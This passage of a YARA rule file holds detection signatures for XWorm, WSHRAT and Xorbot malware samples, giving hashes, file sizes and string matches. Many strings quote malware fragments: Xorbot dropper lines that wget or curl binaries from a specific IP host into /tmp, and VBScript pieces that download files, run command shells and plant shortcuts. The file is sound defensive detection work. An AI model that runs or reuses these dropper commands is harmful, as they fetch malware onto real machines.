      description = "_subset_batch - file XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_db5ba574.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "db5ba574b6107181d23ff1cc5b20b6fd69a559c9b80c6ecd16466223567e472a"
   strings:
      $s1 = "lSystem.Resources.ResourceReader, mscorlib, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.R" ascii /* score: '27.00'*/
      $s2 = "XWormClient.exe" fullword wide /* score: '22.00'*/
      $s3 = "YzcuazCpPa.exe" fullword wide /* score: '22.00'*/
      $s4 = "img.Scr" fullword wide /* score: '15.00'*/
      $s5 = "CriticalProcesses_Disable" fullword ascii /* score: '11.00'*/
      $s6 = "ProcessCritical" fullword ascii /* score: '11.00'*/
      $s7 = "SetCurrentProcessIsCritical" fullword ascii /* score: '11.00'*/
      $s8 = "CriticalProcess_Enable" fullword ascii /* score: '11.00'*/
      $s9 = "SystemEvents_SessionEnding" fullword ascii /* score: '10.00'*/
      $s10 = "-zTXtDescription" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 300KB and
      all of them
}

rule XWorm_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__16f222a0 {
   meta:
      description = "_subset_batch - file XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_16f222a0.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "16f222a071e89c5d5d5b5b4f63cac0fe4f7813ef83a10993f8e9c7195caa2d33"
   strings:
      $s1 = "123.exe" fullword wide /* score: '19.00'*/
      $s2 = "C# version only supports level 1 and 3" fullword wide /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 200KB and
      all of them
}

rule XWorm_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__0cd9932e {
   meta:
      description = "_subset_batch - file XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_0cd9932e.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "0cd9932ef0f794f0834b03a9bbe4c2c891995955e7c2f1b030161b04cb89036e"
   strings:
      $s1 = "System.Security.Permissions.SecurityPermissionAttribute, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934" ascii /* score: '27.00'*/
      $s2 = "123.exe" fullword wide /* score: '19.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 80KB and
      all of them
}

rule XWorm_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__3a58244f {
   meta:
      description = "_subset_batch - file XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_3a58244f.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "3a58244f64478f21752ad1632645b662136a5caceeb897cc9325c97c65d49bc5"
   strings:
      $s1 = "AUG15thbuild.exe" fullword wide /* score: '22.00'*/
      $s2 = "XLogger" fullword ascii /* score: '14.00'*/
      $s3 = "LoggerPath" fullword ascii /* score: '14.00'*/
      $s4 = "DownloadStr" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 300KB and
      all of them
}

rule WSHRAT_signature__e136512a {
   meta:
      description = "_subset_batch - file WSHRAT(signature)_e136512a.vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e136512a3700a832d3d29ecfed48c38c584634db900533bcd8c71e73f3ec5a89"
   strings:
      $x1 = "\"&g&\"next\"&g&\"end If\"&g&\"end If\"&g&\"end if\"&g&\"next\"&g&\"err.clear\"&g&\"end sub\"&g&\"sub uninstall\"&g&\"on error r" ascii /* score: '74.00'*/
      $x2 = " \"&g&\"set objfsodownload = createobject (\"&p&\"scripting.filesystemobject\"&p&\")\"&g&\"if  objfsodownload.fileexists (strsav" ascii /* score: '73.00'*/
      $x3 = "text=\"dim sh \"&g&\"set sh = wscript.createobject(\"&p&\"wscript.shell\"&p&\")\"&g&\"dim fs\"&g&\"set fs = createobject(\"&p&\"" ascii /* score: '59.00'*/
      $x4 = "evel=impersonate}!\\\\.\\root\\cimv2\"&p&\")\"&g&\"set colitems = objwmiservice.execquery(\"&p&\"select * from win32_operatingsy" ascii /* score: '35.00'*/
      $x5 = "d f!\"&g&\"f! enumprocess ()\"&g&\"on error resume next\"&g&\"set objwmiservice = getobject(\"&p&\"winmgmts:\\\\.\\root\\cimv2\"" ascii /* score: '34.00'*/
      $x6 = "& \"&p&\"\\\"&p&\"  & foldername & \"&p&\".lnk\"&p&\") \"&g&\"lnkobj.windowstyle = 7\"&g&\"lnkobj.targetpath = \"&p&\"wscript.ex" ascii /* score: '31.00'*/
      $s7 = "h & \"&p&\"\\\"&p&\"  & newfldr(i))\"&g&\"strIconPath = \"&p&\"%SystemRoot%\\system32\\SHELL32.dll,3\"&p&\"\"&g&\"With sh.Create" ascii /* score: '30.00'*/
      $s8 = "strIconPath\"&g&\".WindowStyle = 7\"&g&\".Save()\"&g&\"end with\"&g&\"Next\"&g&\"cmp=0\"&g&\"for each folder in fs.getfolder( dr" ascii /* score: '30.00'*/
      $s9 = " colitems = objwmiservice.execquery(\"&p&\"select * from win32_process\"&p&\",,48)\"&g&\"dim objitem\"&g&\"for each objitem in c" ascii /* score: '28.00'*/
      $s10 = " \"&g&\"if objhttpdownload.status = 200 then\"&g&\"dim  objstreamdownload\"&g&\"set  objstreamdownload = createobject(\"&p&\"ado" ascii /* score: '28.00'*/
      $s11 = "h & \"&p&\".lnk\"&p&\") \"&g&\".TargetPath = \"&p&\"wscript.exe\"&p&\"\"&g&\".WorkingDirectory = \"&p&\"\"&p&\"\"&g&\".Arguments" ascii /* score: '27.00'*/
      $s12 = "\\\\.\\root\\cimv2\"&p&\")\"&g&\"set disks = root.execquery (\"&p&\"select * from win32_logicaldisk\"&p&\")\"&g&\"for each disk " ascii /* score: '27.00'*/
      $s13 = "numprocess = enumprocess & objitem.executablepath & YzNC\"&g&\"next\"&g&\"end f!\"&g&\"sub exitprocess (pid)\"&g&\"on error resu" ascii /* score: '27.00'*/
      $s14 = "p&\"%comspec% /c \"&p&\" & M2R)\"&g&\"if not oexec.stdout.atendofstream then\"&g&\"readallfromany = oexec.stdout.readall\"&g&\"e" ascii /* score: '27.00'*/
      $s15 = "ronmentstrings(\"&p&\"%username%\"&p&\") & YzNC\"&g&\"set root = getobject(\"&p&\"winmgmts:{impersonationlevel=impersonate}!" ascii /* score: '26.00'*/
   condition:
      uint16(0) == 0x3d70 and filesize < 40KB and
      1 of ($x*) and all of them
}

rule XWorm_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__0d7b3d3a {
   meta:
      description = "_subset_batch - file XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_0d7b3d3a.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "0d7b3d3a1a2257f09d90175a220ac804bbe48c1377bfbbe55b66440bb2728b39"
   strings:
      $s1 = "svchost" fullword ascii /* PEStudio Blacklist: strings */ /* score: '18.00'*/
      $s2 = "*.* /s /d" fullword wide /* score: '13.00'*/
      $s3 = "attrib -h -s " fullword wide /* score: '12.00'*/
      $s4 = "regread" fullword wide /* score: '11.00'*/
      $s5 = "CFWspy5P3hHNADG1NcTqzeynbvmarfkOuE6E366pjxkOAgBmtnraXU3SfIWxXRRmumZgCyVQ" fullword ascii /* score: '9.00'*/
      $s6 = "oPtABXGsIqSi4Evi3a9exGNJQ0q3GKLOGLiCov45nzIY8XTzKmQs8DmnfBea3q69gZIWMgpp3wfbXNFfsVUe5M6X5f" fullword ascii /* score: '9.00'*/
      $s7 = "WZGETipISpv5n" fullword ascii /* score: '9.00'*/
      $s8 = "YzBpt2NYS6qOetJRy6D66EOetcIBZfV6X3NQRsIaPlSXfYGKwCFMsCKnHgRcXliLAUqF304aDlLHupKCwDHGeSJAAN" fullword wide /* score: '9.00'*/
      $s9 = "VJ1rk5FmyXc2KGetM" fullword wide /* score: '9.00'*/
      $s10 = "G7AZJvC4tnMyPNI8BGxcoS0rKRhSRED6aVSIhYYuvmkWMs59DHJ9ZJoVXa" fullword ascii /* score: '8.00'*/
      $s11 = "windowstyle" fullword wide /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 200KB and
      8 of them
}

rule XWorm_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__6675521a {
   meta:
      description = "_subset_batch - file XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_6675521a.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "6675521a633a72a7f423976ea467930775fb51ae59a9839e8bd53032fe3cb68f"
   strings:
      $s1 = "Settings.exe" fullword wide /* score: '22.00'*/
      $s2 = "WHKEYBOARDLL" fullword ascii /* score: '14.50'*/
      $s3 = "XLogger" fullword ascii /* score: '14.00'*/
      $s4 = "LoggerPath" fullword ascii /* score: '14.00'*/
      $s5 = "*.* /s /d" fullword wide /* score: '13.00'*/
      $s6 = "attrib -h -s " fullword wide /* score: '12.00'*/
      $s7 = "regread" fullword wide /* score: '11.00'*/
      $s8 = "CriticalProcesses_Disable" fullword ascii /* score: '11.00'*/
      $s9 = "ProcessCritical" fullword ascii /* score: '11.00'*/
      $s10 = "SetCurrentProcessIsCritical" fullword ascii /* score: '11.00'*/
      $s11 = "CriticalProcess_Enable" fullword ascii /* score: '11.00'*/
      $s12 = "SystemEvents_SessionEnding" fullword ascii /* score: '10.00'*/
      $s13 = "anyrun" fullword ascii /* score: '8.00'*/
      $s14 = "windowstyle" fullword wide /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 100KB and
      8 of them
}

rule XWorm_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__68a52cfb {
   meta:
      description = "_subset_batch - file XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_68a52cfb.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "68a52cfb27f3b23251b0b4fdebfe15bc0abc0fe7249996ce0b9ab762b831618c"
   strings:
      $s1 = "asdasdasdsadsa.exe" fullword wide /* score: '22.00'*/
      $s2 = "WHKEYBOARDLL" fullword ascii /* score: '14.50'*/
      $s3 = "XLogger" fullword ascii /* score: '14.00'*/
      $s4 = "LoggerPath" fullword ascii /* score: '14.00'*/
      $s5 = "*.* /s /d" fullword wide /* score: '13.00'*/
      $s6 = "attrib -h -s " fullword wide /* score: '12.00'*/
      $s7 = "regread" fullword wide /* score: '11.00'*/
      $s8 = "CriticalProcesses_Disable" fullword ascii /* score: '11.00'*/
      $s9 = "ProcessCritical" fullword ascii /* score: '11.00'*/
      $s10 = "SetCurrentProcessIsCritical" fullword ascii /* score: '11.00'*/
      $s11 = "CriticalProcess_Enable" fullword ascii /* score: '11.00'*/
      $s12 = "SystemEvents_SessionEnding" fullword ascii /* score: '10.00'*/
      $s13 = "anyrun" fullword ascii /* score: '8.00'*/
      $s14 = "windowstyle" fullword wide /* score: '8.00'*/
      $s15 = "asdasdasdsadsa" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 100KB and
      8 of them
}

rule XWorm_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__d95b28a3 {
   meta:
      description = "_subset_batch - file XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_d95b28a3.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "d95b28a388740e01832e83fccfb6eb8b07188c36ffdcc5d73fa9d00754946459"
   strings:
      $s1 = "SearchSystem.exe" fullword wide /* score: '25.00'*/
      $s2 = "*.* /s /d" fullword wide /* score: '13.00'*/
      $s3 = "attrib -h -s " fullword wide /* score: '12.00'*/
      $s4 = "regread" fullword wide /* score: '11.00'*/
      $s5 = "DxJeticLDlLse1" fullword ascii /* score: '10.00'*/
      $s6 = "ip3azhDndqcLoGTlh1DVtRiOgsbCvwFxasPsFnAIpvOngR" fullword ascii /* score: '9.00'*/
      $s7 = "yyzPsnqDkmmW08waVIggB2yruMwPBFqG99DRlogncDpeZsXJq5UXPCh2JJT1K5Bn" fullword ascii /* score: '9.00'*/
      $s8 = "hTCWbXwEc451McgOJkH1ztgpzGjloGql29thflnmlhlHzjYskHUUXxvQrrffW9BmkdSXBdXmm5JQKVjrf" fullword ascii /* score: '9.00'*/
      $s9 = "Y0XEHK9SzfOZnxhKhH7IsavHLOdc1tsPYvUN1JLOWGfCTW" fullword ascii /* score: '9.00'*/
      $s10 = "lGFVv9R3nj9OGXj9zmpEc1Qjb13J0E80PsCxGENpmySr7HygaOyUVavoo2EXSWYJ9O9jAtNsPyn0Y9WYI" fullword ascii /* score: '9.00'*/
      $s11 = "gje3OV9fWqDLLd8H7Zc8WDVqk0Dl5T8KejS5AJYHQExjSA9bQb38c2Ns1vYzE2aHvMJ3og33IyX9vENin" fullword wide /* score: '9.00'*/
      $s12 = "b5THOnrdg1UnOqWGKlh92JU4yxAi3zubGoCTuWHgtVCIwa5CKVSm8Lmp9jzBQ79QzppoCPTqW1wZ7getp" fullword wide /* score: '9.00'*/
      $s13 = "jIy02tAIRCFFYxH10uGR9QbCJPh66NfJR3ufmMkKZFuxKoxxPfmSqaBflR4iIjlIws5tMV93FgxIWprgA" fullword wide /* score: '9.00'*/
      $s14 = "windowstyle" fullword wide /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 800KB and
      8 of them
}

rule Xorbot_signature_ {
   meta:
      description = "_subset_batch - file Xorbot(signature).sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "6e66ca36a7fa67accc233793597d2c59e64c1b41fc02db623e28139a0b78fa6f"
   strings:
      $s1 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/PL3zZ8lnOUM5Z2j2nKs0D6p28BhDMS9FR7; curl -" ascii /* score: '30.00'*/
      $s2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/0AUZUybhIcjNWXXgDe08tAzEFgfFCCNN7l; curl -" ascii /* score: '30.00'*/
      $s3 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/Ujigbnye8fjnlQjJjCEdmYYOrHaG1IDXi6; curl -" ascii /* score: '30.00'*/
      $s4 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/boOlR0MjkU8F1pDcsLs1fsLHFHbpTiFq7K; curl -" ascii /* score: '30.00'*/
      $s5 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/9QcvZ5t1RHqT17RnHkhGyCwjGzFd2mhomL; curl -" ascii /* score: '30.00'*/
      $s6 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/6SjYzOx06fuuNLblIRF2aj5ZiauziPhdT3; curl -" ascii /* score: '30.00'*/
      $s7 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/2VhHzWyoxcCTwRU9ZzuDivCpt6ipz4IQhd; curl -" ascii /* score: '30.00'*/
      $s8 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/a9SUwYXRmKegpI3uyppINbBUVRNxEAlv4C; curl -" ascii /* score: '30.00'*/
      $s9 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/3g94eiP1cJO0MiN9YFSGpQauRMuBaOTPCD; curl -" ascii /* score: '30.00'*/
      $s10 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/HJKSYJWfh5XqeildLI5cOBH9DrA4GcP6at; curl -" ascii /* score: '30.00'*/
      $s11 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/bojf5pYC9FWENyYAPyf4G3OVJ7qaQ1Jfy6; curl -" ascii /* score: '30.00'*/
      $s12 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/vlkgTFw7a4EF6DWgpesHmWKywxHxCokOvh; curl -" ascii /* score: '30.00'*/
      $s13 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/PGk538T16zy5BF1EpatxOQi81YQ2f6AzaF; curl -" ascii /* score: '30.00'*/
      $s14 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/KsoJdsvl5645XffcQ5mwtK02Td8j4AZ5GY; curl -" ascii /* score: '30.00'*/
      $s15 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/PL3zZ8lnOUM5Z2j2nKs0D6p28BhDMS9FR7; curl -" ascii /* score: '27.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 30KB and
      8 of them
}

rule Xorbot_signature__004cc05d {
   meta:
      description = "_subset_batch - file Xorbot(signature)_004cc05d.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "004cc05d230b5ec1a11b1a3ec4267492f67c44c5e09079612d90e07cbf0526b3"
   strings:
      $s1 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/yfedIZWCqmbFAIvC7VrIwINhdGEtfRqFX8; curl -" ascii /* score: '30.00'*/
      $s2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/8o5AiJvfpA8ijLjmeaz6YtBgYpaAJXdI2c; curl -" ascii /* score: '30.00'*/
      $s3 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/AuLyc2QMNbQG5Z8vtjuIFlHhtFvTnIWTD5; curl -" ascii /* score: '30.00'*/
      $s4 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/GxMZxxAbYbLwBjtUakjqye9HOT9xN7JhM1; curl -" ascii /* score: '30.00'*/
      $s5 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/m7QiACfKhDS6h5FMRm9nmY9W9wDL5oWlFq; curl -" ascii /* score: '30.00'*/
      $s6 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/BpwaxjfOW8OLR7nKDI8C7Dfg5yu0vKYvX4; curl -" ascii /* score: '30.00'*/
      $s7 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/6AztRA5lTriFt4RVFj598wSuFDXDdQGFlE; curl -" ascii /* score: '30.00'*/
      $s8 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/xf96dilY4FbGfcwckWBC2UFWT9firdBsWY; curl -" ascii /* score: '30.00'*/
      $s9 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/XbN6N94i41XMM9ssr2xHn5Fwh07437j8bw; curl -" ascii /* score: '30.00'*/
      $s10 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/fGKiRhehFPilmJhqv0AG4L1Yf0syy2Lrpm; curl -" ascii /* score: '30.00'*/
      $s11 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/MZM13f4OYhWrH7mObgy1uliXZrV7BHKxLU; curl -" ascii /* score: '30.00'*/
      $s12 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/5gLLbO2QDzSr6Ao4tZvo95dP2aFQzoJ8H6; curl -" ascii /* score: '30.00'*/
      $s13 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/uIc4GUKCWZKZCB56I6tlq1UO0R7WwJObEs; curl -" ascii /* score: '30.00'*/
      $s14 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/lQ6Mq7U3Rc6V9ATPmskO26cz6PGJE9rqPV; curl -" ascii /* score: '30.00'*/
      $s15 = "wget http://178.16.54.252/bins/yfedIZWCqmbFAIvC7VrIwINhdGEtfRqFX8; curl -O  http://178.16.54.252/bins/yfedIZWCqmbFAIvC7VrIwINhdG" ascii /* score: '27.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 30KB and
      8 of them
}

rule Xorbot_signature__00c35787 {
   meta:
      description = "_subset_batch - file Xorbot(signature)_00c35787.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "00c357873f9603d98a2644820ba887fb48c35ddf82867e3cd1283f23729e9d84"
   strings:
      $s1 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/yB7RhJSgmmuWkZQgs0cfCsfsBdhyFXvSJx; curl -" ascii /* score: '30.00'*/
      $s2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/IeC4VejWpPCpU3svwJqT11jVu5WdPnh6US; curl -" ascii /* score: '30.00'*/
      $s3 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/W196M2MYQI7G3eCHqyCBORi0xDKUCSEZr2; curl -" ascii /* score: '30.00'*/
      $s4 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/mKUuUnejdikDW96njvIbWdjh6369WgwKXm; curl -" ascii /* score: '30.00'*/
      $s5 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/tZRenq5aYBcNZ799iNLq7WXvaU4IMV2cuc; curl -" ascii /* score: '30.00'*/
      $s6 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/vncZYVhEwMdgkxq2Y8EduIcj6jGnBQ0nBH; curl -" ascii /* score: '30.00'*/
      $s7 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/G278dikikf7JGoQ8XRA26srTE326pP3aw4; curl -" ascii /* score: '30.00'*/
      $s8 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/PQd0LQwC5cYn3UZgfClIB16jWiAYR3Q8tQ; curl -" ascii /* score: '30.00'*/
      $s9 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/H2yakDF9TfQKaK7xdpcPXGkF5a07ZHJOLs; curl -" ascii /* score: '30.00'*/
      $s10 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/wqTtSEVHItc9oHtYqgNPDTmX7KIJOgPPpx; curl -" ascii /* score: '30.00'*/
      $s11 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/WSFedrszfQ9KlUfpoTGdJATC3bbyOPKPci; curl -" ascii /* score: '30.00'*/
      $s12 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/ywhpSLTw0GOw3xK39wG61XH3vcSs1l6NOA; curl -" ascii /* score: '30.00'*/
      $s13 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/SKay2mpTu68ATiYXQ9l7VYT689vxF7ve3w; curl -" ascii /* score: '30.00'*/
      $s14 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/A2zs3G3gi1m6qOcciDVa4w56MNODtpA2fV; curl -" ascii /* score: '30.00'*/
      $s15 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/tZRenq5aYBcNZ799iNLq7WXvaU4IMV2cuc; curl -" ascii /* score: '27.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 30KB and
      8 of them
}

rule Xorbot_signature__06f43463 {
   meta:
      description = "_subset_batch - file Xorbot(signature)_06f43463.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "06f43463dae95ce3c860c2f1a707d68b3efbc6c986684a047eaa2c5ef1a3ff3f"
   strings:
      $s1 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/0lje1GJxtQZ3bcqWNfMyufEikQWETkm7WQ; curl -" ascii /* score: '30.00'*/
      $s2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/33RuOkbIAUpIIsk3FxPwGZj2Of1oac7qpZ; curl -" ascii /* score: '30.00'*/
      $s3 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/igtu1czd0FxiF5t7Fq5F4h4KQkuPhcFgmU; curl -" ascii /* score: '30.00'*/
      $s4 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/aBeFputoSEDVfZz1s94KAeofvupTDWgwtq; curl -" ascii /* score: '30.00'*/
      $s5 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/iCM33xBNH3Z6z60mSxA3XdYaERspxC5G0B; curl -" ascii /* score: '30.00'*/
      $s6 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/fHcW4LBPg6el0nQagKlq376CsjAynthbec; curl -" ascii /* score: '30.00'*/
      $s7 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/bH3SGPQNzAFn33PtOLGNreOqIXbaKnl6Hy; curl -" ascii /* score: '30.00'*/
      $s8 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/w6DKvhRQBt4kcJ9zdwTotwEFf0mvmAeZ8T; curl -" ascii /* score: '30.00'*/
      $s9 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/eyt7mqfnOa8f6EiaMzNY0EWAlM6nIqJQ0T; curl -" ascii /* score: '30.00'*/
      $s10 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/q11AjhQPMKx5kgHIWiplrcyv4xyHuRqhr3; curl -" ascii /* score: '30.00'*/
      $s11 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/KD92lWSTBMF7JN9XiNOyLiLtduoEIxwjCH; curl -" ascii /* score: '30.00'*/
      $s12 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/GdMgcjrLWXpgnD6jemhzOb2aBfCPmBXenj; curl -" ascii /* score: '30.00'*/
      $s13 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/lXQ0uXxqGjZ6jwrQ7ozKkhNiQzazi54GSH; curl -" ascii /* score: '30.00'*/
      $s14 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/CTS6K2omd0sE53shec703QQakS20ejpzce; curl -" ascii /* score: '30.00'*/
      $s15 = "wget http://178.16.54.252/bins/KD92lWSTBMF7JN9XiNOyLiLtduoEIxwjCH; curl -O  http://178.16.54.252/bins/KD92lWSTBMF7JN9XiNOyLiLtdu" ascii /* score: '27.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 30KB and
      8 of them
}

rule Xorbot_signature__0f602e3c {
   meta:
      description = "_subset_batch - file Xorbot(signature)_0f602e3c.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "0f602e3c57b55cd06502c3b4ac727a93e26fd15d873ea39bc54e3e21d19c0d99"
   strings:
      $s1 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/9PtOjfXuG7vxF4cn5VbLju32MUZeG1sLDo; curl -" ascii /* score: '30.00'*/
      $s2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/Nqr1qYcy1jxH1epAhAc6IOcsyhQt0DoTjQ; curl -" ascii /* score: '30.00'*/
      $s3 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/aOB2rI7MCnSzCRu3tTkBvPokXrlUPjH3yI; curl -" ascii /* score: '30.00'*/
      $s4 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/cIF4iVRR1cvljPsulnHLRPdp383r1NIbMw; curl -" ascii /* score: '30.00'*/
      $s5 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/2wQ5e55WxUrXt9WQY6Alrn0xHG0sprFunp; curl -" ascii /* score: '30.00'*/
      $s6 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/mrw98gZSukGuOtvzpCumY8VKNQu5rv0QET; curl -" ascii /* score: '30.00'*/
      $s7 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/GBfwlJGrVUH1q9fylUQvtr3SvTi7EaFb9E; curl -" ascii /* score: '30.00'*/
      $s8 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/MQvKyRHziNUr84aClK2FgWcpfrTNOjTzqP; curl -" ascii /* score: '30.00'*/
      $s9 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/vDTUbLWfKxpASf6b23fQycY6xVJLMdlzJI; curl -" ascii /* score: '30.00'*/
